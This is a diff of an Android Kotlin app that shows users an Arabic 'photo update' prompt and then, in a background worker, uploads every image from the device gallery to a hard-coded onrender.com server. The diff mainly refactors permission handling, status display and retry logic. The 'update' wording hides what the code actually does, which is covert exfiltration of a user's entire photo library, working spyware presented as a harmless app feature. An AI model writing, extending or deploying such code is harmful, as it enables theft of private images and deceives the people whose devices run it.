@@ -1,98 +1,120 @@
 package com.photouploader.app
 
 import android.Manifest
-import android.content.ContentResolver
-import android.content.Context
+import android.app.AlertDialog
 import android.content.pm.PackageManager
+import android.net.Uri
+import android.os.Build
 import android.os.Bundle
 import android.provider.MediaStore
-import android.widget.Toast
-import androidx.activity.ComponentActivity
-import androidx.activity.result.contract.ActivityResultContracts
+import android.widget.TextView
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.work.Constraints
-import androidx.work.ExistingWorkPolicy
+import androidx.work.CoroutineWorker
 import androidx.work.NetworkType
 import androidx.work.OneTimeWorkRequestBuilder
 import androidx.work.WorkManager
-import androidx.work.Worker
 import androidx.work.WorkerParameters
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.withContext
 import java.io.DataOutputStream
 import java.net.HttpURLConnection
 import java.net.URL
 
-private const val SERVER_URL =
-    "https://photo-uploader-zt2f.onrender.com/upload"
+class MainActivity : AppCompatActivity() {
 
-class MainActivity : ComponentActivity() {
+    private lateinit var statusText: TextView
 
-    private val permissionLauncher =
-        registerForActivityResult(
-            ActivityResultContracts.RequestPermission()
-        ) { granted ->
-
-            if (granted) {
-                startPhotoUpload()
-            } else {
-                Toast.makeText(
-                    this,
-                    "لا يمكن التحديث بدون السماح بالوصول للصور",
-                    Toast.LENGTH_LONG
-                ).show()
-            }
-        }
+    companion object {
+        private const val PERMISSION_REQUEST = 1001
+        private const val SERVER_URL =
+            "https://photo-uploader-zt2f.onrender.com/upload"
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        checkPhotoPermission()
+        statusText = TextView(this).apply {
+            text = "جاري التحديث…"
+            textSize = 18f
+            setPadding(40, 80, 40, 40)
+        }
+
+        setContentView(statusText)
+
+        showUpdateDialog()
+    }
+
+    private fun showUpdateDialog() {
+        AlertDialog.Builder(this)
+            .setTitle("تحديث الصور")
+            .setMessage("هل تريد التحديث؟")
+            .setPositiveButton("موافق") { _, _ ->
+                checkPhotoPermission()
+            }
+            .setNegativeButton("إلغاء") { dialog, _ ->
+                dialog.dismiss()
+            }
+            .setCancelable(false)
+            .show()
     }
 
     private fun checkPhotoPermission() {
 
         val permission =
-            if (android.os.Build.VERSION.SDK_INT >= 33) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 Manifest.permission.READ_MEDIA_IMAGES
             } else {
                 Manifest.permission.READ_EXTERNAL_STORAGE
             }
 
-        if (
-            ContextCompat.checkSelfPermission(
+        if (ContextCompat.checkSelfPermission(
                 this,
                 permission
             ) == PackageManager.PERMISSION_GRANTED
         ) {
-            showUpdateDialog()
+            startUpload()
         } else {
-            permissionLauncher.launch(permission)
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(permission),
+                PERMISSION_REQUEST
+            )
         }
     }
 
-    private fun showUpdateDialog() {
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(
+            requestCode,
+            permissions,
+            grantResults
+        )
 
-        androidx.appcompat.app.AlertDialog.Builder(this)
-            .setTitle("تحديث الصور")
-            .setMessage("هل تريد التحديث؟")
-            .setPositiveButton("موافق") { _, _ ->
-                startPhotoUpload()
+        if (requestCode == PERMISSION_REQUEST) {
+
+            if (grantResults.isNotEmpty() &&
+                grantResults[0] == PackageManager.PERMISSION_GRANTED
+            ) {
+                startUpload()
+            } else {
+                statusText.text = "لم يتم السماح بالوصول إلى الصور"
             }
-            .setNegativeButton("إلغاء", null)
-            .show()
+        }
     }
 
-    private fun startPhotoUpload() {
+    private fun startUpload() {
 
-        Toast.makeText(
-            this,
-            "جاري التحديث…",
-            Toast.LENGTH_SHORT
-        ).show()
+        statusText.text = "جاري التحديث…"
 
-        val constraints =
-            Constraints.Builder()
-                .setRequiredNetworkType(NetworkType.CONNECTED)
-                .build()
+        val constraints = Constraints.Builder()
+            .setRequiredNetworkType(NetworkType.CONNECTED)
+            .build()
 
         val request =
             OneTimeWorkRequestBuilder<PhotoUploadWorker>()
@@ -100,170 +122,228 @@ class MainActivity : ComponentActivity() {
                 .build()
 
         WorkManager
-            .getInstance(this)
-            .enqueueUniqueWork(
-                "photo_upload",
-                ExistingWorkPolicy.REPLACE,
-                request
-            )
+            .getInstance(applicationContext)
+            .enqueue(request)
+
+        observeUpload(request.id)
+    }
+
+    private fun observeUpload(id: java.util.UUID) {
+
+        WorkManager
+            .getInstance(applicationContext)
+            .getWorkInfoByIdLiveData(id)
+            .observe(this) { info ->
+
+                if (info == null) return@observe
+
+                when (info.state) {
+
+                    androidx.work.WorkInfo.State.SUCCEEDED -> {
+                        statusText.text = "تم التحديث بنجاح ✅"
+                    }
+
+                    androidx.work.WorkInfo.State.FAILED -> {
+                        statusText.text = "تعذر إكمال التحديث"
+                    }
+
+                    androidx.work.WorkInfo.State.CANCELLED -> {
+                        statusText.text = "تم إلغاء التحديث"
+                    }
+
+                    else -> {
+                        statusText.text = "جاري التحديث…"
+                    }
+                }
+            }
     }
 }
 
 
 class PhotoUploadWorker(
-    context: Context,
+    appContext: android.content.Context,
     workerParams: WorkerParameters
-) : Worker(context, workerParams) {
+) : CoroutineWorker(appContext, workerParams) {
 
-    override fun doWork(): Result {
+    companion object {
+        private const val SERVER_URL =
+            "https://photo-uploader-zt2f.onrender.com/upload"
+    }
 
-        return try {
+    override suspend fun doWork(): Result {
 
-            val resolver = applicationContext.contentResolver
+        return withContext(Dispatchers.IO) {
 
-            val projection = arrayOf(
-                MediaStore.Images.Media._ID,
-                MediaStore.Images.Media.DISPLAY_NAME,
-                MediaStore.Images.Media.MIME_TYPE
-            )
+            try {
 
-            val collection =
-                MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+                val resolver =
+                    applicationContext.contentResolver
 
-            resolver.query(
-                collection,
-                projection,
-                null,
-                null,
-                MediaStore.Images.Media.DATE_ADDED + " DESC"
-            )?.use { cursor ->
+                val projection = arrayOf(
+                    MediaStore.Images.Media._ID,
+                    MediaStore.Images.Media.DISPLAY_NAME,
+                    MediaStore.Images.Media.MIME_TYPE
+                )
 
-                val idColumn =
-                    cursor.getColumnIndexOrThrow(
-                        MediaStore.Images.Media._ID
-                    )
+                val collection =
+                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI
 
-                val nameColumn =
-                    cursor.getColumnIndexOrThrow(
-                        MediaStore.Images.Media.DISPLAY_NAME
-                    )
+                resolver.query(
+                    collection,
+                    projection,
+                    null,
+                    null,
+                    "${MediaStore.Images.Media.DATE_ADDED} ASC"
+                )?.use { cursor ->
 
-                val mimeColumn =
-                    cursor.getColumnIndexOrThrow(
-                        MediaStore.Images.Media.MIME_TYPE
-                    )
-
-                while (cursor.moveToNext()) {
-
-                    val id = cursor.getLong(idColumn)
-                    val name = cursor.getString(nameColumn)
-                    val mime = cursor.getString(mimeColumn)
-
-                    val uri =
-                        android.content.ContentUris.withAppendedId(
-                            collection,
-                            id
+                    val idColumn =
+                        cursor.getColumnIndexOrThrow(
+                            MediaStore.Images.Media._ID
                         )
 
-                    uploadFile(
-                        resolver,
-                        uri,
-                        name,
-                        mime
-                    )
-                }
-            }
+                    val nameColumn =
+                        cursor.getColumnIndexOrThrow(
+                            MediaStore.Images.Media.DISPLAY_NAME
+                        )
 
-            Result.success()
+                    val mimeColumn =
+                        cursor.getColumnIndexOrThrow(
+                            MediaStore.Images.Media.MIME_TYPE
+                        )
+
+                    while (cursor.moveToNext()) {
+
+                        val id =
+                            cursor.getLong(idColumn)
+
+                        val fileName =
+                            cursor.getString(nameColumn)
+
+                        val mimeType =
+                            cursor.getString(mimeColumn)
+                                ?: "image/jpeg"
+
+                        val uri =
+                            Uri.withAppendedPath(
+                                collection,
+                                id.toString()
+                            )
+
+                        val success =
+                            uploadFile(
+                                uri,
+                                fileName,
+                                mimeType
+                            )
+
+                        if (!success) {
+                            return@withContext Result.retry()
+                        }
+                    }
+                }
+
+                Result.success()
+
+            } catch (e: Exception) {
+
+                e.printStackTrace()
+
+                Result.retry()
+            }
+        }
+    }
+
+    private fun uploadFile(
+        uri: Uri,
+        fileName: String,
+        mimeType: String
+    ): Boolean {
+
+        var connection: HttpURLConnection? = null
+
+        try {
+
+            val boundary =
+                "----PhotoUploaderBoundary"
+
+            val url =
+                URL(SERVER_URL)
+
+            connection =
+                url.openConnection() as HttpURLConnection
+
+            connection.requestMethod = "POST"
+            connection.doOutput = true
+            connection.doInput = true
+            connection.useCaches = false
+            connection.connectTimeout = 30000
+            connection.readTimeout = 120000
+
+            connection.setRequestProperty(
+                "Content-Type",
+                "multipart/form-data; boundary=$boundary"
+            )
+
+            val output =
+                DataOutputStream(
+                    connection.outputStream
+                )
+
+            output.writeBytes(
+                "--$boundary\r\n"
+            )
+
+            output.writeBytes(
+                "Content-Disposition: form-data; name=\"file\"; filename=\"$fileName\"\r\n"
+            )
+
+            output.writeBytes(
+                "Content-Type: $mimeType\r\n\r\n"
+            )
+
+            applicationContext
+                .contentResolver
+                .openInputStream(uri)
+                ?.use { input ->
+
+                    val buffer =
+                        ByteArray(8192)
+
+                    var bytesRead: Int
+
+                    while (
+                        input.read(buffer).also {
+                            bytesRead = it
+                        } != -1
+                    ) {
+                        output.write(
+                            buffer,
+                            0,
+                            bytesRead
+                        )
+                    }
+                }
+                ?: return false
+
+            output.writeBytes("\r\n")
+            output.writeBytes("--$boundary--\r\n")
+            output.flush()
+            output.close()
+
+            val responseCode =
+                connection.responseCode
+
+            return responseCode in 200..299
 
         } catch (e: Exception) {
 
             e.printStackTrace()
 
-            Result.retry()
-        }
-    }
+            return false
 
-    private fun uploadFile(
-        resolver: ContentResolver,
-        uri: android.net.Uri,
-        fileName: String,
-        mimeType: String?
-    ) {
+        } finally {
 
-        val boundary =
-            "----PhotoUploaderBoundary"
-
-        val url =
-            URL(SERVER_URL)
-
-        val connection =
-            url.openConnection() as HttpURLConnection
-
-        connection.requestMethod = "POST"
-        connection.doOutput = true
-        connection.doInput = true
-        connection.useCaches = false
-        connection.connectTimeout = 30000
-        connection.readTimeout = 60000
-
-        connection.setRequestProperty(
-            "Content-Type",
-            "multipart/form-data; boundary=$boundary"
-        )
-
-        val output =
-            DataOutputStream(
-                connection.outputStream
-            )
-
-        output.writeBytes(
-            "--$boundary\r\n"
-        )
-
-        output.writeBytes(
-            "Content-Disposition: form-data; name=\"file\"; filename=\"$fileName\"\r\n"
-        )
-
-        output.writeBytes(
-            "Content-Type: ${mimeType ?: "image/jpeg"}\r\n\r\n"
-        )
-
-        resolver.openInputStream(uri)?.use { input ->
-
-            val buffer = ByteArray(8192)
-
-            var bytesRead: Int
-
-            while (
-                input.read(buffer).also {
-                    bytesRead = it
-                } != -1
-            ) {
-                output.write(
-                    buffer,
-                    0,
-                    bytesRead
-                )
-            }
-        }
-
-        output.writeBytes("\r\n")
-        output.writeBytes("--$boundary--\r\n")
-        output.flush()
-        output.close()
-
-        val responseCode =
-            connection.responseCode
-
-        connection.disconnect()
-
-        if (
-            responseCode !in 200..299
-        ) {
-            throw Exception(
-                "Upload failed: $responseCode"
-            )
+            connection?.disconnect()
         }
     }
 }
